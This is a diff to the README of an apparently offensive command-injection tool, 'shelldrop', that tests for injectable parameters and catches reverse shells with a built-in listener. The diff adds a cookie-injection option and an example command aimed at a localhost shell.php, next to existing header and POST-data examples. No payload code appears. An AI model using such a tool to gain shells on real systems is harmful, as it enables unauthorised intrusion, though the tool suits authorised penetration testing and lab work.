@@ -28,6 +28,7 @@ usage: shelldrop [-h|--help] -l|--lhost "<value>" -p|--lport <integer>
                  [-P|--payload "<value>"] -u|--url "<value>" [-X|--method
                  (GET|POST|PUT|PATCH|DELETE)] [-d|--data "<value>"]
                  [-H|--header "<value>" [-H|--header "<value>" ...]]
+                 [-C|--cookie "<value>" [-C|--cookie "<value>" ...]]
                  [--no-listener] [--no-color]
 
                  A command injection tool that automatically tests for working
@@ -45,6 +46,7 @@ Arguments:
   -X  --method       The request method. Default: GET
   -d  --data         POST data [*]
   -H  --header       Header "Name: Value" pairs, can be used multiple times [*]
+  -C  --cookie       Cookie "Name=Value" pairs, can be used multiple times [*]
       --no-listener  Disable the built-in listener
       --no-color     Disable color output
 ```
@@ -73,6 +75,11 @@ shelldrop -l 127.0.0.1 -p 7331 -u "http://localhost/shell.php" -X POST -d '{"vul
 #### Header Injection
 ```bash
 shelldrop -l 127.0.0.1 -p 7331 -u "http://localhost/shell.php" -H "User-Agent: SHELLDROP"
+```
+
+#### Cookie Injection
+```bash
+shelldrop -l 127.0.0.1 -p 7331 -u "http://localhost/shell.php" -C "vuln_cookie=SHELLDROP"
 ```
 
 #### Using External Listener
